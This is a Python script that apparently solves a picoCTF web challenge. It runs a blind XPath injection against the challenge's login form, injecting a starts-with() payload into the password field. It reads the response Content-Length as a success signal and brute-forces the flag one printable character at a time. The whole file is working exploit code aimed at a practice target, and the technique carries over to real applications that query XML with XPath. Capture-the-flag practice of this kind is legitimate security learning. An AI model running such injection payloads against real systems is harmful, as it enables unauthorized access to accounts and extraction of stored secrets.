#!/usr/bin/env python3

import requests, string


# Status based on content-length in response
FAILED = 3295
SUCCESS = 3311


CHAR_SET = string.printable.strip()
url = "http://mercury.picoctf.net:59946/"


def send_req(char):
	r = requests.post(url, data={
		"name": "admin",
		"pass": "' or //*[starts-with(text(), '" + char +"')] or '1'='2"
		})

	return int(r.headers['Content-Length'])


def brute_char(discovered):
	for char in CHAR_SET:
		print(f'Trying: {discovered + char}')
		res = send_req(discovered + char)
		if res == SUCCESS:
			return discovered + char

	return 0


def main():
	seen_password = "picoCTF{"
	res = 0
	while True:
		res = brute_char(seen_password)
		if res == 0:
			print(f'\nDone!\nYour flag is: {seen_password}')
			break
		else:
			seen_password = res


if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print("\nBye\n")
		exit(1)
